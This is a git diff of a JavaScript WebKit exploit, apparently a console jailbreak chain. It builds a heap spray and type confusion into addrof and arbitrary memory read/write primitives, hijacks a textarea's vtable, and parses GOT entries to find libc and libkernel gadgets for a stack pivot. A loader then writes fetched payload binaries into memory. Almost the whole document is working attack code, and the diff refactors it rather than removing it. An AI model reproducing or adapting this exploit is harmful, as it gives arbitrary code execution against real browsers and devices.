@@ -1,78 +1,99 @@
 var leaker_obj = {'a': 0};var leaker_arr = new Uint32Array(6);var oob_slave = new Uint8Array(1024);var oob_master = new Uint32Array(7);
 var target = {'a': 2.1100820415101592e-303, 'b': false, 'c': true, 'd': 5678}; var spray = [];
-function spray_one(){
-    var x = new Uint32Array(1);
-    x[spray.length+'spray'] = 123;spray.push(x);
-};
-for(var i = 0; i < 0x8000; i++)spray_one();
+var target2 = {'a': 2.1100820415101592e-303, 'b': false, 'c': true, 'd': 5678}; var spray = [];
+const spray_size = 0x18000; 
+var spray = new Array(spray_size); 
+for (var i = 0; i < spray_size; i++) {
+    spray[i] = new Uint32Array(1);
+    spray[i][i + 'spray'] = 123; 
+}
 var impl_idx = 0;
-function create_impl(){
-    var ans = {'a': target}; 
-    ans[1+'x'] = {};
-    ans[2+'x'] = {};
+function create_impl()
+{
+    var ans = {a: target};
+    for(var i = 0; i < 32; i++)
+        ans[(impl_idx++)+'x'] = {};
     return ans;
-};
-function trigger(x){var o = {'a': 1}; for(var i in o){{i = x;function i(){return i;};};o[i]; };
-if(impl.a != target){target.c = leaker_obj;leaker_obj.a = leaker_obj;var l1 = impl.a[4];var l2 = impl.a[5];leaker_obj.a = oob_slave;var s1 = impl.a[4];var s2 = impl.a[5];target.c = leaker_arr;impl.a[4] = l1;impl.a[5] = l2;target.c = oob_master;impl.a[4] = s1;impl.a[5] = s2;impl.a = target;throw "exploit finished";};};
+}
+function trigger(x){
+    var o = {'a': 1}; for(var i in o){{i = x;function i(){return i;};};try { o[i]; } catch(e) {} };
+        if (impl.a !== target && typeof impl.a === 'object') {
+        target.c = leaker_obj;
+        leaker_obj.a = leaker_obj;
+        
+            var l1 = impl.a[4], l2 = impl.a[5];
+        
+        leaker_obj.a = oob_slave;
+        var s1 = impl.a[4], s2 = impl.a[5];
+        
+        target.c = leaker_arr;
+        impl.a[4] = l1; 
+        impl.a[5] = l2;
+        
+        target.c = oob_master;
+        impl.a[4] = s1; 
+        impl.a[5] = s2;
+        
+        impl.a = target;
+        throw "exploit finished";
+    }}
 try{ 
-// for(var _ = 0; _ < 1; _++) {
-    var impl = create_impl(); var s = {'a': impl};trigger(s);
-// }
+    var impl = create_impl(); 
+    trigger({'a': impl});
 }catch(e){}
-
-function i48_put(x, a)
-{
+function i48_put(x, a) {
     a[4] = x | 0;
-    a[5] = (x / 4294967296) | 0;
+    a[5] = (x / 4294967296) | 0; 
 };
-
-function i48_get(a)
-{
-    return a[4] + a[5] * 4294967296;
+function i48_get(a) {
+    var high = a[5];
+    if (high < 0) high += 0x100000000;
+    return a[4] + high * 4294967296;
 };
-
-function addrof(x)
-{
+function addrof(x) {
     leaker_obj.a = x;
     return i48_get(leaker_arr);
 };
-
-// function fakeobj(x)
-// {
-//     i48_put(x, leaker_arr);
-//     return leaker_obj.a;
-// };
-
-function read_mem_setup(p, sz) //for others
+function read_mem(p, sz) {
+    read_mem_setup(p, sz);
+    return Array.from(oob_slave.slice(0, sz));
+};
+function read_ptr_at(p) {
+    var bytes = read_mem(p, 8);
+    var value = 0;
+    for (var i = 7; i >= 0; i--) {
+        value = (value * 256) + bytes[i];
+    }
+    return value;
+};
+function write_mem(p, data)
+{
+    i48_put(p, oob_master);
+    oob_master[6] = data.length;
+    oob_slave.set(data, 0);
+};
+    
+function write_ptr_at(p, value) {
+    var bytes = new Uint8Array(8);
+    for (var i = 0; i < 8; i++) {
+        bytes[i] = value & 0xff;
+        value = Math.floor(value / 256);
+    }
+    write_mem(p, bytes); 
+};
+function read_mem_setup(p, sz) 
 {
     i48_put(p, oob_master);
     oob_master[6] = sz;
 };
-
-function read_mem(p, sz)
-{
-    read_mem_setup(p, sz);
-    var arr = [];
-    for(var i = 0; i < sz; i++)
-        arr.push(oob_slave[i]);
-    return arr;
-};
-
-// function read_mem_s(p, sz)
-// {
-//     read_mem_setup(p, sz);
-//     return ""+oob_slave;
-// };
-
-function read_mem_b(p, sz) //*************?????? */
+function read_mem_b(p, sz) 
 {
     read_mem_setup(p, sz);
     var b = new Uint8Array(sz);
     b.set(oob_slave);
     return b;
 };
-
-function read_mem_as_string(p, sz)  //*************?????? */
+function read_mem_as_string(p, sz)
 {
     var x = read_mem_b(p, sz);
     var ans = '';
@@ -80,37 +101,7 @@ function read_mem_as_string(p, sz)  //*************?????? */
         ans += String.fromCharCode(x[i]);
     return ans;
 };
-
-function write_mem(p, data)
-{
-    i48_put(p, oob_master);
-    oob_master[6] = data.length;
-    // read_mem_setup(p, data.length);
-    for(var i = 0; i < data.length; i++)
-        oob_slave[i] = data[i];
-};
-
-function read_ptr_at(p)
-{
-    var ans = 0;
-    var d = read_mem(p, 8);
-    for(var i = 7; i >= 0; i--)
-        ans = 256 * ans + d[i];
-    return ans;
-};
-
-function write_ptr_at(p, d)
-{
-    var arr = [];
-    for(var i = 0; i < 8; i++)
-    {
-        arr.push(d & 0xff);
-        d /= 256;
-    };
-    write_mem(p, arr);
-};
-
-var malloc_nogc = [];
+let malloc_nogc = [];
 function malloc(sz)
 {
     var arr = new Uint8Array(0x10000+sz);
@@ -118,71 +109,63 @@ function malloc(sz)
     return read_ptr_at(addrof(arr)+0x10);
 };
 var tarea = document.createElement('textarea');
-
 var real_vt_ptr = read_ptr_at(addrof(tarea)+0x18);
 var fake_vt_ptr = malloc(0x400);
 write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));
-
 var real_vtable = read_ptr_at(fake_vt_ptr);
 var fake_vtable = malloc(0x2000);
 write_mem(fake_vtable, read_mem(real_vtable, 0x2000));
 write_ptr_at(fake_vt_ptr, fake_vtable);
-
 var fake_vt_ptr_bak = malloc(0x400);
 write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));
-
 var plt_ptr = read_ptr_at(fake_vtable) - 10063176;
-
-function get_got_addr(idx)
-{
+function get_got_addr(idx) {
     var p = plt_ptr + idx * 16;
     var q = read_mem(p, 6);
-    if(q[0] != 0xff || q[1] != 0x25){
-        // document.title = `Error-System`
-        // window.webname.innerText = `Error-System`
-        throw "invalid GOT entry";
+    
+    if (q[0] !== 0xff || q[1] !== 0x25) {
+        throw "Invalid GOT entry";
     }
-    var offset = 0;
-    for(var i = 5; i >= 2; i--)
-        offset = offset * 256 + q[i];
-    offset += p + 6;
-    return read_ptr_at(offset);
+    
+    var offset = q[2] | (q[3] << 8) | (q[4] << 16) | (q[5] << 24);
+    return read_ptr_at(p + 6 + offset);
 };
-
 var webkit_base = read_ptr_at(fake_vtable);
-// try{
 var libkernel_base = get_got_addr(705)-0x10000;
 var libc_base = get_got_addr(582);
 var saveall_addr = libc_base+0x2e2c8;
-/********************** */
 var loadall_addr = libc_base+0x3275c;
 var setjmp_addr = libc_base+0xbfae0;
 var longjmp_addr = libc_base+0xbfb30;
-var pivot_addr = libc_base+0x327d2; //////////////
+var pivot_addr = libc_base+0x327d2; 
 var infloop_addr = libc_base+0x447a0;
-var jop_frame_addr = libc_base+0x715d0; //////////////
+var jop_frame_addr = libc_base+0x715d0;
 var get_errno_addr_addr = libkernel_base+0x9ff0;
-var pthread_create_addr = libkernel_base+0xf980; //////////////
-
+var pthread_create_addr = libkernel_base+0xf980;
 async function pivot(buf)
 {
     var ans = await malloc(0x400);
-    await write_ptr_at(fake_vtable+0x1d8, saveall_addr);
-    await write_ptr_at(await addrof(tarea)+0x18, fake_vt_ptr);
-    tarea.scrollLeft = 0;
-    await write_ptr_at(await addrof(tarea)+0x18, real_vt_ptr);
-    await write_mem(ans, await read_mem(fake_vt_ptr, 0x400));
-    await write_mem(fake_vt_ptr, await read_mem(fake_vt_ptr_bak, 0x400));
-    await write_ptr_at(fake_vtable+0x1d8, pivot_addr);
-    await write_ptr_at(fake_vt_ptr+0x38, buf);
-    await write_ptr_at(ans+0x38, await read_ptr_at(ans+0x38)-16);
-    await write_ptr_at(buf, ans);
-    await write_ptr_at(await addrof(tarea)+0x18, fake_vt_ptr);
-    tarea.scrollLeft = 0;
-    await write_ptr_at(await addrof(tarea)+0x18, real_vt_ptr);
-    await write_mem(fake_vt_ptr, await read_mem(fake_vt_ptr_bak, 0x400));
+    function set_vtable(ptr) {
+        write_ptr_at(addrof(tarea) + 0x18, ptr);
+        tarea.scrollLeft = 0;
+    }
+    
+    write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
+    set_vtable(fake_vt_ptr);
+    set_vtable(real_vt_ptr);
+    
+    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
+    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
+    
+    write_ptr_at(fake_vtable + 0x1d8, pivot_addr);
+    write_ptr_at(fake_vt_ptr + 0x38, buf);
+    write_ptr_at(ans + 0x38, read_ptr_at(ans + 0x38) - 16);
+    write_ptr_at(buf, ans);
+    
+    set_vtable(fake_vt_ptr);
+    set_vtable(real_vt_ptr);
+    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
 };
-
 var sys_670_addr = libkernel_base + 0x1efc0;
 var sys_192_addr = libkernel_base + 0x1efe0;
 var sys_586_addr = libkernel_base + 0x1f000;
@@ -490,7 +473,6 @@ var sys_141_addr = libkernel_base + 0x21710;
 var sys_392_addr = libkernel_base + 0x21730;
 var sys_559_addr = libkernel_base + 0x21750;
 var sys_133_addr = libkernel_base + 0x21770;
-
 var aio_init_addr = sys_670_addr;
 var fpathconf_addr = sys_192_addr;
 var dmem_container_addr = sys_586_addr;
@@ -849,23 +831,19 @@ async function getHen() {
 }
 async function loader(path){
     window.msgs.style.color='block';
-
     let info = await getfile("ldr.bin")
-
     window.ldr_bin_len=info.len;
     window.ldr_bin = malloc(window.ldr_bin_len);
     write_mem(window.ldr_bin,info.data);
-
     let info2 = await getfile("pl/"+path)
     
-    if(path==='Fan-Threshold.bin') info2.data[0x1E30] = window.temp.value;
-
+    if(path==='Fan-Threshold.bin') 
+        info2.data[0x1E30] = window.temp.value;
     window.ldr_bin_2_len=info2.len;
     window.ldr_bin_2 = malloc(window.ldr_bin_2_len);
     write_mem(window.ldr_bin_2,info2.data);
     await sleep(100);
     await netcat();
     display("注入文件:\n"+path);
-
 }
 window.WEBKIT_Exploit=1;
